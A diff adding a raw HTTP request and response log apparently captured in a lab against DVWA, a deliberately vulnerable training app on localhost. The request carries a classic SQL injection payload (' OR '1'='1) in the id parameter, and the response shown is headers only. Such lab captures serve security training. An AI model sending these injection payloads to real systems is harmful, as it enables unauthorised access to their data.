@@ -1,0 +1,36 @@
+Raw Request
+------------
+
+GET http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
+host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Referer: http://127.0.0.1/dvwa/vulnerabilities/sqli/
+Cookie: security=low; PHPSESSID=uuhqu9jelv7b7ud0gu7ei9hsu1; theme=light
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+
+
+Raw Response
+-------------
+
+HTTP/1.1 200 OK
+Date: Tue, 16 Sep 2025 07:39:58 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+X-Powered-By: PHP/8.2.12
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4901
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+
+
